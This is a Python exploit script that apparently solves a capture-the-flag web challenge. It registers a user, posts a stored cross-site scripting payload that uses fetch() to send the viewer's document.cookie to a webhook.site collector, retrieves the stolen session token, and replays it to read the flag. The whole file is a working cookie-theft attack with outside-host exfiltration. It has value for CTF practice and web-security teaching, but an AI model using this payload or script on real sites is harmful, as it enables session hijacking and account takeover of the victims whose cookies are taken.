#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
import random
import string
from time import sleep

URL = "http://chal.gryphons.sg:1337"

# https://webhook.site
# e.g "https://webhook.site/487a95aa-1434-435c-959e-23e739a70375"
WEBHOOK_URL = "https://webhook.site/487a95aa-1434-435c-959e-23e739a70375"
WEBHOOK_TOKEN_ID = WEBHOOK_URL.split("/")[-1]
WEBHOOK_HEADERS = {"api-key": WEBHOOK_TOKEN_ID}


def generate_random_string(length=10):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))


def register(username, password):
    register_page = f"{URL}/api/register"
    register_data = {
        "username": username,
        "password": password
    }

    register_req = requests.post(register_page, json=register_data)

    if register_req.status_code == 200:
        return True
    else:
        raise Exception("Registration failed!")


def login(username, password):
    login_page = f"{URL}/api/login"
    login_data = {
        "username": username,
        "password": password
    }

    login_req = requests.post(login_page, json=login_data)

    if login_req.status_code == 200:
        return login_req.json()["token"]
    else:
        raise Exception("Login failed!")


def create_post(token, webhook_url):
    temp = generate_random_string(10)
    page = f"{URL}/api/create"
    payload = f"<img src=x onerror=\"fetch('{webhook_url}?'+document.cookie)\">"
    print("[*] Payload: ", payload)

    data = {
        "title": temp,
        "content": payload,
    }

    headers = {
        "Cookie": f"token={token}",
    }

    flag_req = requests.post(page, json=data, headers=headers)

    if flag_req.status_code == 200:
        return True
    else:
        raise Exception("Post creation failed!")


def steal_token():
    r = requests.get('https://webhook.site/token/' +
                     WEBHOOK_TOKEN_ID + '/requests', headers=WEBHOOK_HEADERS)
    try:
        stolen_token = r.json()["data"][0]["query"]["token"]
        return stolen_token
    except:
        print("[-] Failed to steal token, sleeping for another 5 seconds...")
        sleep(5)
        return steal_token()


def get_flag(token):
    flag_url = f"{URL}/flag"
    headers = {
        "Cookie": f"token={token}",
    }

    flag_req = requests.get(flag_url, headers=headers)
    flag = flag_req.text.split("<code>")[1].split("</code>")[0]
    return flag


if __name__ == "__main__":
    USER = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
    PASS = "".join(random.choice(string.ascii_lowercase) for _ in range(10))

    try:
        print("[*] Registering user...")
        register(USER, PASS)

        print(f"[*] Logging in with username: {USER} and password: {PASS}")
        token = login(USER, PASS)
        print("[+] Login successful!")

        print("[*] Creating post...")
        create_post(token, WEBHOOK_URL)
        print("[+] Post created!")

        print("[*] Sleeping for 5 seconds...")
        sleep(5)

        print("[*] Stealing token...")
        stolen_token = steal_token()
        print("[+] Token:", stolen_token)

        print("[*] Getting flag...")
        flag = get_flag(stolen_token)
        print("[+] Flag:", flag)

    except Exception as e:
        print("[-] An error occurred:", e)
        exit(1)
